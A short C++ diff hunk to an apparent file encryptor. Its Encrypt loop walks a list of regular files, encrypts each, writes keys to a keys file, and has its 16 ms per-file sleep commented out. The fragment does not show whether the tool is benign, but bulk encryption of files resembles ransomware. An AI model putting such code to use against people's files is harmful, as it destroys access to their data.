@@ -58,7 +58,7 @@ void Encryptor::Encrypt()
     auto keysOS = std::ofstream(keysPath.string());
     for (auto &filePath: regularFiles_) {
         EncryptRegularFile(filePath, keysOS);
-        std::this_thread::sleep_for(std::chrono::milliseconds(16));
+        //std::this_thread::sleep_for(std::chrono::milliseconds(16));
     }
 
     std::cout << "Encryption finished\n" << std::flush;
